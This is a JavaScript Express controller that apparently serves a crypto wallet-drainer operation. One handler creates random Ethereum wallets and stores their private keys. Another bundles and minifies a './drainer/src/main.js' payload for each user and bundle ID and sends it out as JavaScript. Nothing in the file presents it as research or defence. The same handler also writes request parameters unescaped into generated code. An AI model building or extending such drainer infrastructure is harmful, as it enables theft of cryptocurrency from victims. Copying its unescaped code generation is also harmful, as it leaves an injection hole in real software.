import fs from "fs";
import path from "path";
import esbuild from "esbuild";
import ethers from "ethers";

import CONSTANTS from "../config/CONSTANTS.js";
import seinApi from "../apis/seinApi.js";
import wallets from "../utils/wallets.js";

const getRandomAddress = async (req, res) => {
  const seedPhrase = await ethers.Wallet.createRandom().mnemonic;
  const wallet = await ethers.Wallet.fromMnemonic(seedPhrase.phrase);
  const privateKey = wallet.privateKey;
  const address = wallet.address;

  wallets.add(address, privateKey);

  return res.status(200).send({
    address,
  });
};

const getUserBundle = async (req, res) => {
  const { userId, bundleId } = req.params;
  const { error, ...user } = await seinApi.getUserBundle(userId, bundleId);
  if (error) return res.status(404).send();
  return res.send(user);
};

const requestBundle = async (req, res) => {
  const tempFilePath = path.join("./", "temp.js");
  try {
    const userId = req.params.userId;
    const bundleId = req.params.bundleId;

    const tempFileContent = `
      window.process = { 
        env: {
          USER_ID:"${userId}",
          BUNDLE_ID:"${bundleId}",
          SERVER_DOMAIN:"${CONSTANTS.SERVER_DOMAIN}",
        } 
      };
      import('./drainer/src/main.js')
    `;

    fs.writeFileSync(tempFilePath, tempFileContent);

    const result = await esbuild.build({
      entryPoints: [tempFilePath],
      bundle: true,
      mangleQuoted: true,
      minify: true,
      write: false, // Don't write to disk yet
      loader: {
        ".js": "jsx",
        ".css": "text",
      },
      format: "esm",
    });

    const bundleOutput = result.outputFiles[0].text; // Get the bundled output

    fs.unlinkSync(tempFilePath);
    res.setHeader("Content-Type", "application/javascript");

    res.send(bundleOutput);
  } catch (error) {
    console.error("Build failed:", error);

    fs.unlinkSync(tempFilePath);

    res.status(500).send({ error: "Build failed", details: error.message });
  }
};

export default {
  getRandomAddress,
  getUserBundle,
  requestBundle,
};
